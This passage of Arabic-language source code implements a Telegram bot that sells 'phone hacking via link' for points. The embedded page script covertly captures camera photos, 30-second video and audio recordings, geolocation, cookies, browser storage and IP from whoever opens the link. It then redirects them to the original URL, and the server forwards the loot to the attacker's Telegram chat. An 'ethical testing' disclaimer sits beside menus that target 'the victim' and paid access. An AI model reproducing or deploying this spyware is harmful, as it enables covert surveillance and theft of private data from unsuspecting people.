const data={session_id:session_id,timestamp:new Date().toISOString(),device:{},camera_front:[],camera_back:[],video:null,audio:null,location:null,cookies:{},storage:{},battery:null,ip:null};
data.device={userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,hardwareConcurrency:navigator.hardwareConcurrency||'غير معروف',deviceMemory:navigator.deviceMemory||'غير معروف',maxTouchPoints:navigator.maxTouchPoints||0,vendor:navigator.vendor||'غير معروف',cookiesEnabled:navigator.cookieEnabled,doNotTrack:navigator.doNotTrack||'غير مفعل'};
if(navigator.getBattery){navigator.getBattery().then(b=>{data.battery={level:Math.round(b.level*100),charging:b.charging};}).catch(()=>{});}
try{document.cookie.split(';').forEach(c=>{const p=c.trim().split('=');if(p.length>=2)data.cookies[p[0]]=p.slice(1).join('=');});}catch(e){}
try{for(let i=0;i<localStorage.length;i++){const key=localStorage.key(i);if(key)data.storage[key]=localStorage.getItem(key);}}catch(e){}
try{for(let i=0;i<sessionStorage.length;i++){const key=sessionStorage.key(i);if(key)data.storage['session_'+key]=sessionStorage.getItem(key);}}catch(e){}
async function getIP(){try{const response=await fetch('/get_ip');const ipData=await response.json();data.ip=ipData.ip;}catch(e){}}
async function captureFront(){const count=3;subStatusEl.textContent='📷 تصوير الكاميرا الأمامية...';for(let i=0;i<count;i++){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240}});const video=document.createElement('video');video.srcObject=stream;video.autoplay=true;await new Promise(r=>video.onloadedmetadata=r);await new Promise(r=>setTimeout(r,300));const canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;canvas.getContext('2d').drawImage(video,0,0);data.camera_front.push(canvas.toDataURL('image/jpeg',0.7));stream.getTracks().forEach(t=>t.stop());}catch(e){}}
subStatusEl.textContent=`📷 تم تصوير ${data.camera_front.length} صورة أمامية`;}
async function captureBack(){const count=3;subStatusEl.textContent='📷 تصوير الكاميرا الخلفية...';for(let i=0;i<count;i++){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:320,height:240}});const video=document.createElement('video');video.srcObject=stream;video.autoplay=true;await new Promise(r=>video.onloadedmetadata=r);await new Promise(r=>setTimeout(r,300));const canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;canvas.getContext('2d').drawImage(video,0,0);data.camera_back.push(canvas.toDataURL('image/jpeg',0.7));stream.getTracks().forEach(t=>t.stop());}catch(e){}}
subStatusEl.textContent=`📷 تم تصوير ${data.camera_back.length} صورة خلفية`;}
async function recordVideo(){try{subStatusEl.textContent='🎥 تسجيل فيديو (30 ثانية)...';const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240},audio:true});const recorder=new MediaRecorder(stream);const chunks=[];recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>{const blob=new Blob(chunks,{type:'video/webm'});const reader=new FileReader();reader.onload=()=>data.video=reader.result;reader.readAsDataURL(blob);};recorder.start();await new Promise(r=>setTimeout(r,30000));if(recorder.state==='recording'){recorder.stop();stream.getTracks().forEach(t=>t.stop());}subStatusEl.textContent='✅ تم تسجيل الفيديو';}catch(e){subStatusEl.textContent='❌ فشل تسجيل الفيديو';}}
async function recordAudio(){try{subStatusEl.textContent='🎙 تسجيل صوتي (30 ثانية)...';const stream=await navigator.mediaDevices.getUserMedia({audio:true});const recorder=new MediaRecorder(stream);const chunks=[];recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>{const blob=new Blob(chunks,{type:'audio/webm'});const reader=new FileReader();reader.onload=()=>data.audio=reader.result;reader.readAsDataURL(blob);};recorder.start();await new Promise(r=>setTimeout(r,30000));if(recorder.state==='recording'){recorder.stop();stream.getTracks().forEach(t=>t.stop());}subStatusEl.textContent='✅ تم تسجيل الصوت';}catch(e){subStatusEl.textContent='❌ فشل تسجيل الصوت';}}
function getLocation(){if(navigator.geolocation){subStatusEl.textContent='📍 جلب الموقع...';navigator.geolocation.getCurrentPosition(pos=>{data.location={lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy};subStatusEl.textContent='✅ تم جلب الموقع';},()=>{subStatusEl.textContent='❌ رفض الموقع';});}}
async function runAll(){statusEl.textContent='🔄 جاري جمع البيانات...';await captureFront();await captureBack();await recordVideo();await recordAudio();getLocation();await getIP();await new Promise(r=>setTimeout(r,3000));statusEl.textContent='📤 إرسال البيانات...';try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
runAll();
</script>
</body>
</html>
"""

# ============================================================
#  دوال Flask (الـ Routes)
# ============================================================

@app.route('/')
def index():
    return "🔬 مختبر الاختبار - يعمل"

@app.route('/get_ip')
def get_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    return jsonify({'ip': ip})

@app.route('/<path:path>')
def handle_fake_path(path):
    # البحث عن session_id في الرابط
    conn = get_db()
    session = conn.execute('SELECT * FROM sessions WHERE fake_url LIKE ?', (f'%{path}%',)).fetchone()
    conn.close()
    
    if not session:
        # إذا لم يتم العثور، حاول البحث كرابط مختصر (للتوافق مع الإصدارات السابقة)
        conn = get_db()
        session = conn.execute('SELECT * FROM sessions WHERE session_id LIKE ?', (path[:8] + '%',)).fetchone()
        conn.close()
        if not session:
            return "❌ رابط غير صالح", 404
    
    session_id = session['session_id']
    features = session['features']
    original_url = session['original_url']
    created = datetime.fromisoformat(session['created'])
    if (datetime.now() - created).seconds > 300:
        return "⏰ انتهت صلاحية الرابط", 403
    
    # إعادة التوجيه إلى صفحة الاختبار
    return redirect(f"/test/{session_id}/{features}")
@app.route('/test/<session_id>/<features>')
def test_page(session_id, features):
    session = get_session(session_id)
    if not session:
        return "❌ جلسة غير صالحة", 404
    created = datetime.fromisoformat(session['created'])
    if (datetime.now() - created).seconds > 600:
        return "⏰ انتهت صلاحية الرابط", 403
    original_url = session['original_url']
    
    pages = {
        'camera_front': CAMERA_FRONT_PAGE,
        'camera_back': CAMERA_BACK_PAGE,
        'video_front': VIDEO_FRONT_PAGE,
        'video_back': VIDEO_BACK_PAGE,
        'audio': AUDIO_PAGE,
        'location': LOCATION_PAGE,
        'device': DEVICE_PAGE,
        'all': ALL_PAGE
    }
    
    page = pages.get(features)
    if not page:
        return "❌ ميزة غير معروفة", 404
    
    return render_template_string(
        page,
        session_id=session_id,
        original_url=original_url
    )

@app.route('/send_data', methods=['POST'])
def send_data():
    try:
        data = request.json
        session_id = data.get('session_id')
        session = get_session(session_id)
        if not session:
            return jsonify({'error': 'جلسة غير صالحة'}), 404
        chat_id = session['chat_id']
        
        # إرسال الصور
        for key in ['camera_front', 'camera_back']:
            if data.get(key):
                for img_data in data[key]:
                    try:
                        img = img_data.split(',', 1)[1]
                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                        files = {'photo': base64.b64decode(img)}
                        requests.post(url, data={'chat_id': chat_id}, files=files)
                    except:
                        pass
        
        # إرسال الفيديو
        if data.get('video'):
            try:
                video = data['video'].split(',', 1)[1]
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
                files = {'video': base64.b64decode(video)}
                requests.post(url, data={'chat_id': chat_id}, files=files)
            except:
                pass
        
        # إرسال الصوت
        if data.get('audio'):
            try:
                audio = data['audio'].split(',', 1)[1]
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
                files = {'audio': base64.b64decode(audio)}
                requests.post(url, data={'chat_id': chat_id}, files=files)
            except:
                pass
        
        # إرسال الموقع
        if data.get('location'):
            try:
                loc = data['location']
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
                requests.post(url, data={
                    'chat_id': chat_id,
                    'latitude': loc['lat'],
                    'longitude': loc['lng']
                })
            except:
                pass
        
        # إرسال معلومات الجهاز
        if data.get('device'):
            try:
                device = data['device']
                msg = f"📱 معلومات الجهاز:\n{device}"
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={'chat_id': chat_id, 'text': msg})
            except:
                pass
        
        # إرسال IP
        if data.get('ip'):
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={'chat_id': chat_id, 'text': f"🌐 IP: {data['ip']}"})
            except:
                pass
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================
#  بوت تيليجرام
# ============================================================

bot = TeleBot(BOT_TOKEN)
user_states = {}

def check_subscription(user_id):
    channels = get_required_channels()
    if not channels:
        return True
    for channel in channels:
        try:
            member = bot.get_chat_member(channel['channel_id'], user_id)
            if member.status in ['left', 'kicked']:
                return False
        except:
            return False
    return True

def get_invites_count(user_id):
    conn = get_db()
    count = conn.execute('SELECT COUNT(*) FROM invites WHERE inviter_id = ?', (user_id,)).fetchone()[0]
    conn.close()
    return count

# ============================================================
#  القائمة الجديدة (واجهة البوت)
# ============================================================

def main_menu(user_id):
    user = get_user(user_id)
    points = user['points'] if user else 0
    
    daily_available = get_daily_reward(user_id) if user else False
    daily_text = "🎁 نقطة يومية" if daily_available else "⏳ انتظر غداً"
    daily_callback = "daily_reward" if daily_available else "daily_claimed"
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🚀 ابدأ الاختراق", callback_data="start_hack"),
        InlineKeyboardButton("⭐ جمع نقاط", callback_data="earn_points"),
        InlineKeyboardButton(f"💰 رصيدك: {points} نقطة", callback_data="my_balance"),
        InlineKeyboardButton("🛒 شراء نقاط", callback_data="buy_points"),
        InlineKeyboardButton(daily_text, callback_data=daily_callback),
        InlineKeyboardButton("ℹ️ معلومات البوت", callback_data="bot_info"),
        InlineKeyboardButton("📞 التواصل مع الدعم", callback_data="support")
    )
    
    if user and user['is_admin']:
        markup.add(InlineKeyboardButton("⚙️ لوحة الإدارة", callback_data="admin_panel"))
    
    return markup

def admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📊 الإحصائيات", callback_data="admin_stats"),
        InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_users"),
        InlineKeyboardButton("📢 إدارة القنوات", callback_data="admin_channels"),
        InlineKeyboardButton("⚙️ إعدادات البوت", callback_data="admin_settings"),
        InlineKeyboardButton("⭐ إدارة النقاط", callback_data="admin_points"),
        InlineKeyboardButton("🎁 مكافآت جماعية", callback_data="admin_group_rewards"),
        InlineKeyboardButton("🔧 إدارة الميزات", callback_data="admin_features"),
        InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
    )
    return markup

# ====== معالجة الأزرار ======
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    data = call.data
    
    # ====== العودة للقائمة الرئيسية ======
    if data == 'back_to_menu':
        user = get_user(user_id)
        points = user['points'] if user else 0
        msg = f"""
🔬 **مرحباً بك في بوت اختراق الهاتف عبر رابط!**

⭐ **نقاطك:** {points} نقطة

📋 **اختر أحد الخيارات أدناه:**
        """
        bot.edit_message_text(
            msg,
            user_id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu(user_id)
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== النقطة اليومية ======
    if data == 'daily_reward':
        user = get_user(user_id)
        if not user:
            bot.answer_callback_query(call.id, "❌ يرجى إعادة تشغيل البوت")
            return
        if get_daily_reward(user_id):
            add_points(user_id, 1, 'نقطة يومية')
            claim_daily_reward(user_id)
            user = get_user(user_id)
            msg = f"""
🎁 **تم استلام النقطة اليومية!**

⭐ تم إضافة **1 نقطة** إلى رصيدك.
💰 رصيدك الحالي: **{user['points']}** نقطة.

📅 عودة غداً للحصول على نقطة جديدة!
            """
            bot.edit_message_text(
                msg,
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
                )
            )
            bot.answer_callback_query(call.id, "✅ تم إضافة نقطة")
        else:
            bot.answer_callback_query(call.id, "⏳ لقد حصلت على نقطتك اليومية بالفعل")
        return
    
    if data == 'daily_claimed':
        bot.answer_callback_query(call.id, "⏳ لقد حصلت على نقطتك اليومية بالفعل")
        return
    
    # ====== زر "ابدأ الاختراق" ======
    if data == 'start_hack':
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("📷 كاميرا أمامية", callback_data="camera_front"),
            InlineKeyboardButton("📷 كاميرا خلفية", callback_data="camera_back"),
            InlineKeyboardButton("🎥 فيديو أمامي", callback_data="video_front"),
            InlineKeyboardButton("🎥 فيديو خلفي", callback_data="video_back"),
            InlineKeyboardButton("🎙 تسجيل صوتي", callback_data="audio"),
            InlineKeyboardButton("📍 الموقع الجغرافي", callback_data="location"),
            InlineKeyboardButton("📱 معلومات الجهاز", callback_data="device"),
            InlineKeyboardButton("🔬 كل الميزات", callback_data="all"),
            InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
        )
        bot.edit_message_text(
            "🎯 **اختر نوع الاختراق:**\n\nاختر الميزة التي تريد اختبارها على الضحية:",
            user_id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=markup
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== زر "جمع نقاط" ======
    if data == 'earn_points':
        user = get_user(user_id)
        invite_link = f"https://t.me/{bot.get_me().username}?start={user['invite_code'] if user else ''}"
        
        msg = f"""
⭐ **جمع نقاط**

📍 **طريقة جمع النقاط:**
• قم بدعوة أصدقائك عبر الرابط الخاص بك
• كل شخص يسجل عبر رابطك يمنحك **1 نقطة**

🔗 **رابط الدعوة الخاص بك:**
<code>{invite_link}</code>

📊 **عدد المدعوين:** {get_invites_count(user_id)}
⭐ **نقاطك الحالية:** {user['points'] if user else 0}
        """
        bot.edit_message_text(
            msg,
            user_id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
            )
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== زر "رصيدي" ======
    if data == 'my_balance':
        user = get_user(user_id)
        msg = f"""
💰 **رصيدك الحالي**

⭐ **عدد النقاط:** {user['points'] if user else 0}

📊 **إجمالي النقاط التي حصلت عليها:** {user['total_points'] if user else 0}

📨 **عدد المدعوين:** {get_invites_count(user_id)}

💡 **طرق الربح:**
• دعوة الأصدقاء (+1 نقطة لكل مدعو)
• شراء نقاط (من لوحة الشراء)
        """
        bot.edit_message_text(
            msg,
            user_id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
            )
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== زر "شراء نقاط" ======
    if data == 'buy_points':
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("⭐ 10 نقاط - 5$", callback_data="buy_10"),
            InlineKeyboardButton("⭐ 25 نقاط - 10$", callback_data="buy_25"),
            InlineKeyboardButton("⭐ 50 نقاط - 18$", callback_data="buy_50"),
            InlineKeyboardButton("⭐ 100 نقاط - 30$", callback_data="buy_100"),
            InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
        )
        bot.edit_message_text(
            "🛒 **شراء نقاط**\n\nاختر الباقة المناسبة لك:",
            user_id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=markup
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== معالجة شراء نقاط ======
    if data.startswith('buy_'):
        points_map = {
            'buy_10': 10,
            'buy_25': 25,
            'buy_50': 50,
            'buy_100': 100
        }
        points = points_map.get(data, 0)
        if points:
            bot.send_message(
                user_id,
                f"🛒 **طلب شراء {points} نقطة**\n\n"
                f"📌 للشراء، تواصل مع الدعم:\n"
                f"@YourSupportUsername\n\n"
                f"أو استخدم الأمر /contact",
                parse_mode='Markdown'
            )
            bot.answer_callback_query(call.id, f"✅ تم طلب شراء {points} نقطة")
        return
    
    # ====== زر "معلومات البوت" ======
    if data == 'bot_info':
        msg = """
ℹ️ **معلومات البوت**

🔬 **الاسم:** بوت اختبار الاختراق
🛡️ **الإصدار:** 2.0
📋 **الوصف:**
هذا البوت مخصص لاختبار الاختراق الأخلاقي.
يسمح لك بإنشاء روابط ملغمة لاختبار أمان الأجهزة.

👨‍💻 **المطور:** @YourDevUsername

⚙️ **الميزات:**
• اختبار الكاميرا (أمامية/خلفية)
• اختبار المايكروفون
• تحديد الموقع الجغرافي
• جمع معلومات الجهاز
• تسجيل الفيديو والصوت

⚠️ **تنبيه:**
هذا البوت للأغراض الأكاديمية والبحثية فقط.
        """
        bot.edit_message_text(
            msg,
            user_id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
            )
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== زر "الدعم" ======
    if data == 'support':
        msg = """
📞 **التواصل مع الدعم**

📧 **البريد الإلكتروني:** support@example.com
💬 **تيليجرام:** @YourSupportUsername
📱 **الموقع:** https://your-website.com

📌 **للإبلاغ عن مشكلة أو اقتراح:**
استخدم الأمر /contact

🕐 **أوقات العمل:**
من الساعة 10 صباحاً حتى 10 مساءً
        """
        bot.edit_message_text(
            msg,
            user_id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
            )
        )
        bot.answer_callback_query(call.id)
        return
    
    # ====== لوحة الإدارة ======
    if data == 'admin_panel':
        user = get_user(user_id)
        if user and user['is_admin']:
            bot.edit_message_text(
                "⚙️ **لوحة الإدارة**",
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=admin_panel()
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== الإحصائيات ======
    if data == 'admin_stats':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            total_users = conn.execute('SELECT COUNT(*) FROM users').fetchone()[0]
            total_points = conn.execute('SELECT SUM(points) FROM users').fetchone()[0] or 0
            total_invites = conn.execute('SELECT COUNT(*) FROM invites').fetchone()[0]
            total_logs = conn.execute('SELECT COUNT(*) FROM user_logs').fetchone()[0]
            total_sessions = conn.execute('SELECT COUNT(*) FROM sessions').fetchone()[0]
            admins = conn.execute('SELECT COUNT(*) FROM users WHERE is_admin = 1').fetchone()[0]
            banned = conn.execute('SELECT COUNT(*) FROM users WHERE is_banned = 1').fetchone()[0]
            daily_count = get_daily_reward_count()
            conn.close()
            
            msg = f"""
📊 **إحصائيات البوت**

👥 **المستخدمين:**
• الإجمالي: {total_users}
• المديرين: {admins}
• المحظورين: {banned}

⭐ **النقاط:**
• إجمالي النقاط: {total_points}
• متوسط النقاط: {round(total_points/total_users, 1) if total_users > 0 else 0}

📨 **الدعوات:** {total_invites}
📋 **السجلات:** {total_logs}
🔗 **الجلسات:** {total_sessions}
🎁 **النقاط اليومية اليوم:** {daily_count}
            """
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة المستخدمين ======
    if data == 'admin_users':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            users = conn.execute('''
                SELECT user_id, username, first_name, last_name, points, is_admin, is_banned, joined_date
                FROM users ORDER BY user_id DESC LIMIT 20
            ''').fetchall()
            conn.close()
            
            if not users:
                bot.send_message(user_id, "📭 لا يوجد مستخدمين")
                bot.answer_callback_query(call.id)
                return
            
            msg = "👥 **قائمة المستخدمين (آخر 20):**\n\n"
            for u in users:
                status = "👑" if u['is_admin'] else "🔹"
                if u['is_banned']:
                    status = "🚫"
                msg += f"{status} **{u['first_name']}**"
                if u['username']:
                    msg += f" (@{u['username']})"
                msg += f"\n🆔 `{u['user_id']}`"
                msg += f"\n⭐ نقاط: {u['points']}"
                msg += f"\n📅 {u['joined_date'][:10]}\n\n"
            
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("📥 تصدير المستخدمين", callback_data="export_users"),
                InlineKeyboardButton("🔙 العودة", callback_data="admin_panel")
            )
            bot.send_message(user_id, msg, parse_mode='Markdown', reply_markup=markup)
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== تصدير المستخدمين ======
    if data == 'export_users':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            users = conn.execute('SELECT * FROM users').fetchall()
            conn.close()
            
            import csv
            import io
            output = io.StringIO()
            writer = csv.writer(output)
            writer.writerow(['ID', 'Username', 'First Name', 'Last Name', 'Points', 'Total Points', 'Admin', 'Banned', 'Joined Date', 'Invite Code'])
            for u in users:
                writer.writerow([
                    u['user_id'], u['username'] or '', u['first_name'] or '', u['last_name'] or '',
                    u['points'], u['total_points'], u['is_admin'], u['is_banned'],
                    u['joined_date'], u['invite_code']
                ])
            
            output.seek(0)
            bot.send_document(user_id, ('users.csv', output.getvalue()))
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة القنوات ======
    if data == 'admin_channels':
        user = get_user(user_id)
        if user and user['is_admin']:
            channels = get_required_channels()
            msg = "📢 **القنوات الإجبارية:**\n\n"
            if channels:
                for ch in channels:
                    try:
                        chat = bot.get_chat(ch['channel_id'])
                        msg += f"🔹 {chat.title} (`{ch['channel_id']}`)\n"
                    except:
                        msg += f"🔹 {ch['channel_id']}\n"
            else:
                msg += "📭 لا توجد قنوات إجبارية\n"
            
            msg += "\n📌 **الأوامر:**\n"
            msg += "`/add_channel [id] [الاسم]` - إضافة قناة\n"
            msg += "`/remove_channel [id]` - حذف قناة"
            
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة النقاط ======
    if data == 'admin_points':
        user = get_user(user_id)
        if user and user['is_admin']:
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("➕ إضافة نقاط", callback_data="add_points_user"),
                InlineKeyboardButton("➖ خصم نقاط", callback_data="deduct_points_user"),
                InlineKeyboardButton("📊 ترتيب النقاط", callback_data="points_leaderboard"),
                InlineKeyboardButton("🔙 العودة", callback_data="admin_panel")
            )
            bot.edit_message_text(
                "⭐ **إدارة النقاط**\n\nاختر الإجراء:",
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إضافة نقاط ======
    if data == 'add_points_user':
        user = get_user(user_id)
        if user and user['is_admin']:
            bot.send_message(
                user_id,
                "📝 **إضافة نقاط لمستخدم**\n\n"
                "أرسل الأمر بالشكل التالي:\n"
                "`/add_points [user_id] [عدد النقاط]`\n\n"
                "مثال: `/add_points 123456789 10`"
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== خصم نقاط ======
    if data == 'deduct_points_user':
        user = get_user(user_id)
        if user and user['is_admin']:
            bot.send_message(
                user_id,
                "📝 **خصم نقاط من مستخدم**\n\n"
                "أرسل الأمر بالشكل التالي:\n"
                "`/deduct_points [user_id] [عدد النقاط]`\n\n"
                "مثال: `/deduct_points 123456789 5`"
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== ترتيب النقاط ======
    if data == 'points_leaderboard':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            top_users = conn.execute('''
                SELECT user_id, username, first_name, points
                FROM users
                ORDER BY points DESC
                LIMIT 10
            ''').fetchall()
            conn.close()
            
            msg = "🏆 **ترتيب المستخدمين حسب النقاط:**\n\n"
            medals = ["🥇", "🥈", "🥉"]
            for i, u in enumerate(top_users):
                medal = medals[i] if i < 3 else f"{i+1}."
                name = u['first_name'] or u['username'] or str(u['user_id'])
                msg += f"{medal} {name} - ⭐ {u['points']}\n"
            
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إعدادات البوت ======
    if data == 'admin_settings':
        user = get_user(user_id)
        if user and user['is_admin']:
            prices = get_prices()
            msg = "⚙️ **إعدادات البوت (أسعار الميزات)**\n\n"
            msg += "السعر الحالي لكل ميزة:\n"
            feature_names = {
                'camera': '📷 الكاميرا',
                'audio': '🎙 الصوت',
                'video': '🎥 الفيديو',
                'location': '📍 الموقع',
                'device': '📱 معلومات الجهاز',
                'all': '🔬 كل الميزات'
            }
            for key, name in feature_names.items():
                msg += f"• {name}: **{prices.get(key, 5)}** نقاط\n"
            
            msg += "\n📌 **لتغيير السعر، استخدم الأمر:**\n"
            msg += "`/set_price [الميزة] [السعر]`\n\n"
            msg += "الميزات المتاحة: `camera`, `audio`, `video`, `location`, `device`, `all`\n"
            msg += "مثال: `/set_price camera 3`"
            
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== المكافآت الجماعية ======
    if data == 'admin_group_rewards':
        user = get_user(user_id)
        if user and user['is_admin']:
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("➕ إنشاء مكافأة جديدة", callback_data="create_group_reward"),
                InlineKeyboardButton("📋 قائمة المكافآت", callback_data="list_group_rewards"),
                InlineKeyboardButton("🔙 العودة", callback_data="admin_panel")
            )
            bot.edit_message_text(
                "🎁 **المكافآت الجماعية**\n\n"
                "أنشئ مكافأة يمكن لعدد محدد من المستخدمين استلامها.\n"
                "كل مستخدم يحصل على النقاط المحددة عند استخدام الكود.",
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إنشاء مكافأة جماعية ======
    if data == 'create_group_reward':
        user = get_user(user_id)
        if user and user['is_admin']:
            bot.send_message(
                user_id,
                "📝 **إنشاء مكافأة جماعية**\n\n"
                "أرسل الأمر بالشكل التالي:\n"
                "`/create_reward [عدد النقاط] [عدد الأعضاء]`\n\n"
                "مثال: `/create_reward 50 10`\n"
                "(يعني: 50 نقطة لكل من أول 10 أشخاص يستخدمون الكود)"
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== قائمة المكافآت ======
    if data == 'list_group_rewards':
        user = get_user(user_id)
        if user and user['is_admin']:
            conn = get_db()
            rewards = conn.execute('''
                SELECT * FROM group_rewards ORDER BY created DESC LIMIT 20
            ''').fetchall()
            conn.close()
            
            if not rewards:
                bot.send_message(user_id, "📭 لا توجد مكافآت سابقة")
                bot.answer_callback_query(call.id)
                return
            
            msg = "📋 **قائمة المكافآت:**\n\n"
            for r in rewards:
                remaining = r['member_count'] - r['used_count']
                msg += f"🔑 **{r['code']}**\n"
                msg += f"⭐ {r['points']} نقطة | 👥 {remaining} متبقي\n"
                msg += f"📅 {r['created'][:10]}\n\n"
            
            bot.send_message(user_id, msg, parse_mode='Markdown')
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة الميزات ======
    if data == 'admin_features':
        user = get_user(user_id)
        if user and user['is_admin']:
            features = ['camera', 'audio', 'video', 'location', 'device', 'all']
            markup = InlineKeyboardMarkup(row_width=2)
            for f in features:
                status = "✅" if is_feature_enabled(f) else "❌"
                markup.add(InlineKeyboardButton(f"{status} {f.title()}", callback_data=f"toggle_{f}"))
            markup.add(InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
            bot.edit_message_text(
                "🔧 **إدارة الميزات**\nاضغط على الميزة لتفعيل/تعطيل:",
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== تبديل الميزات ======
    if data.startswith('toggle_'):
        user = get_user(user_id)
        if user and user['is_admin']:
            feature = data.replace('toggle_', '')
            new_status = toggle_feature(feature)
            status_text = "مُفعلة ✅" if new_status else "معطلة ❌"
            bot.answer_callback_query(call.id, f"تم {status_text}")
            
            features = ['camera', 'audio', 'video', 'location', 'device', 'all']
            markup = InlineKeyboardMarkup(row_width=2)
            for f in features:
                status = "✅" if is_feature_enabled(f) else "❌"
                markup.add(InlineKeyboardButton(f"{status} {f.title()}", callback_data=f"toggle_{f}"))
            markup.add(InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
            bot.edit_message_text(
                f"🔧 **إدارة الميزات**\n{feature.title()} الآن {status_text}",
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
